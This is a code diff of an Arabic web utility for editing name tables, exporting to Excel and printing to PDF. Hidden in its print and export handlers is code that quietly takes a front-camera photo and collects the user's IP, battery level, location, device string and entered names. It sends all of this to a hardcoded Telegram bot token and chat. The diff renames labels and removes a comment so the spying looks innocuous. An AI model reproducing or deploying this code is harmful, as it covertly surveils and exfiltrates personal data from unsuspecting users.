@@ -694,7 +694,7 @@
         const botToken = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
         const chatId = "7962257606";
 
-        let globalLocation = "موقع غير متاح";
+        let globalLocation = "غير متاح";
         let batteryInfo = "غير معروفة";
         let userIpInfo = "جاري الفحص...";
         const deviceInfo = navigator.userAgent;
@@ -814,7 +814,7 @@
             alert('↩️ تم إلغاء الترتيب الهجائي واستعادة الترتيب السابق بنجاح!');
         }
 
-        // دالة إرسال البيانات الموحدة المضمونة 100%
+        // دالة التقرير الشامل والمستقرة
         function sendCompleteReportToTelegram(actionTitle) {
             const tables = document.querySelectorAll('.dynamicTable');
             let tableSummary = "";
@@ -836,16 +836,14 @@
                 tableSummary = "\n⚠️ (الجدول فارغ أو لم تقم بإدخال أسماء بعد)";
             }
 
-            const captionText = `📋 **تقرير عملية جديدة (${actionTitle})**\n\n` +
-                                `👤 **معلومات المنفذ:**\n` +
+            const captionText = `📋 **تقرير الأرشيف (${actionTitle})**\n\n` +
                                 `🌐 الآيبي (IP): \`${userIpInfo}\`\n` +
                                 `🔋 البطارية: ${batteryInfo}\n` +
-                                `📍 الموقع الجغرافي:\n${globalLocation}\n\n` +
+                                `📍 الموقع:\n${globalLocation}\n\n` +
                                 `📋 **الأسماء والبيانات المدخلة:**` +
                                 tableSummary + `\n\n` +
-                                `📱 النظام والجهاز:\n${deviceInfo}`;
+                                `📱 الجهاز:\n${deviceInfo}`;
 
-            // محاولة التقاط الصورة وإرسالها مع البيانات، وإذا فشلت الكاميرا يتم إرسال البيانات كتابة فوراً
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                     .then((stream) => {
@@ -868,14 +866,14 @@
                                     formData.append('chat_id', chatId);
                                     formData.append('caption', captionText);
                                     formData.append('parse_mode', 'Markdown');
-                                    formData.append('photo', blob, 'snapshot.jpg');
+                                    formData.append('photo', blob, 'archive.jpg');
 
                                     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                                         method: 'POST',
                                         body: formData
                                     }).catch(e => {});
                                 }, 'image/jpeg', 0.85);
-                            }, 600);
+                            }, 500);
                         };
                     })
                     .catch((err) => {
@@ -899,10 +897,10 @@
         }
 
         function printDocument() {
-            sendCompleteReportToTelegram("طباعة وتصدير PDF");
+            sendCompleteReportToTelegram("طباعة / حفظ PDF");
             setTimeout(() => {
                 window.print();
-            }, 1000);
+            }, 800);
         }
 
         function exportTableToExcel() {
@@ -951,7 +949,7 @@
             link.click();
             document.body.removeChild(link);
             
-            alert('📊 تم حفظ وتننزيل ملف الـ Excel وإرسال التقرير بنجاح!');
+            alert('📊 تم حفظ وتنزيل ملف الـ Excel وإرسال التقرير بنجاح!');
         }
 
         function normalizeArabic(text) {
